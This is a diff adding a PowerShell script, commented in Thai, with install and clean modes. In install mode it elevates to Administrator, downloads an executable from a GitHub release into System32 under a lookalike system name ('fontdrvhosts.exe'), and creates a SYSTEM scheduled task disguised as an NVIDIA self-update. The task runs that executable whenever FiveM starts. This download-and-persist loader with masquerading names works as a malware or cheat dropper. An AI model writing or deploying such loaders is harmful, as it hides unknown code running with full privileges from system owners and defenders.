@@ -1,0 +1,71 @@
+# -----------------------------
+# Menu Selection
+# -----------------------------
+# แสดงเมนูให้ผู้ใช้เลือกว่าจะทำ Install หรือ Clean
+Write-Host "Select Mode:"
+Write-Host "1. Install"
+Write-Host "2. Clean"
+
+# รับค่าที่ผู้ใช้ป้อน
+$choice = Read-Host "Enter choice (1/2)"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+# ตรวจสอบว่ากำลังรันด้วยสิทธิ์ Administrator หรือไม่
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "Restarting with Administrator privileges..."
+    # รีสตาร์ทสคริปต์ด้วยสิทธิ์ Administrator
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$system32Path = "$env:windir\System32"                   
+$exeDestination = Join-Path $system32Path "fontdrvhosts.exe"  
+$taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"  
+$exeUrl        = "https://github.com/Chxtoqfee12/Fivem/releases/download/Chx_12/Chx.exe"
+
+
+# -----------------------------
+# Install Mode
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "Starting installation..."
+
+    # ดาวน์โหลดไฟล์ exe ไปยัง System32
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
+
+    # สร้าง Scheduled Task เพื่อให้ exe ทำงานเมื่อเกิดเหตุการณ์
+    $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
+    Invoke-Expression $cmd
+
+    # เปิด Audit Logging สำหรับการสร้าง Process
+    auditpol /set /subcategory:"Process Creation" /success:enable
+
+    Write-Host "Installation completed."
+}
+
+# -----------------------------
+# Clean Mode
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "Cleaning up installation..."
+
+    # ลบ Scheduled Task
+    schtasks /delete /tn $taskName /f
+
+    # ลบไฟล์ exe หากมีอยู่
+    if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force }
+
+    Write-Host "Cleanup completed."
+}
+
+# -----------------------------
+# Invalid Choice
+# -----------------------------
+else {
+    Write-Host "Invalid choice (please select 1 or 2)."
+}
